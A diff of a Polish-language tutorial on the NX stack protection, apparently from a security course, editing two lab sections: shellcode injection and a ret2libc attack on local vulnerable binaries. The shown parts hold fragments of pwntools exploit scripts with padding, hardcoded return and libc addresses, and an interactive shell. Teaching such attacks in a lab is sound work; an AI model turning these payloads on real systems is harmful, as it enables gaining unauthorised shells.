@@ -29,12 +29,12 @@ W przypadku użycia kompilatora `clang` metoda NX jest również defaultowo wł�
 Różnice działania mechanizmu ochrony stosu w tych dwóch systemach jest marginalna. Linux wspiera natomiast dodatkowo software'ową emulację tej metody zabezpieczenia. Wiąże się to jednak ze spadkiem wydajnośći. Niektóre dystrybucje liuxa dla architektrury 32bit mają domyślnie *wyłączone* zabezpieczenie Nx bit (ubuntu, fedora).
 ## 5.1 Przykładowa aplikacji - `shellcode injection`
 
-
+-------------
 PLIKI:
 1. `vuln.c`
 2. `vuln-1.o`
 3. `exploit-1.py`
-
+----------------
 
 Celem poniższego ataku jest uzyskanie shella poprzez umiejscowienie na stosie shellcode.
 
@@ -114,6 +114,8 @@ Finalny exploit wygląda następująco:
 
 from pwn import *
 
+p = process('./vuln-1.o')
+
 padding = b"AAAABBBBCCCCDDDDEEEEFFFFGGGG"
 
 buf_ptr = 0xffffd1d0
@@ -133,8 +135,8 @@ shellcode = """
 
 send = padding + p32(eip) + asm(shellcode)
 
-p = process('./vuln-1.o')
 p.sendline(send)
+
 p.interactive()
 ```
 
@@ -158,12 +160,12 @@ Dla aplikacji z włączonym zabezpieczeniem exploit nie działa. Dostajemy sygna
 
 ## 5.2 Przykładowa aplikacji - `ret2libc`
 
-
+-----------------
 PLIKI:
 1. `vuln.c`
 2. `vuln-2.o`
 3. `exploit-2.py`
-
+-----------------------
 
 Tak jak wspomniałem w `wady i zalety`, pomimo właczonej ochorny `NX`, dalej istnieje moźliwość exploitacji aplikacji - poprzez atak `ret2libc`. W tym ataku, zamiast wykonywać shellcode ze stosu, wykorzystamy funkcję oraz wartości zawarte w `libc`.
 
@@ -237,6 +239,8 @@ Kod exploita:
 
 from pwn import *
 
+p = process('./vuln-2.o')
+
 padding = b"AAAABBBBCCCCDDDDEEEEFFFFGGGG"
 
 system_addres = 0xf7e10040 
@@ -247,8 +251,8 @@ bin_sh_addres = 0xf7f5733c
 
 send = padding + p32(system_addres) + p32(exit_addres) + p32(bin_sh_addres) 
 
-p = process('./vuln-2.o')
 p.sendline(send)
+
 p.interactive()
 ```
 
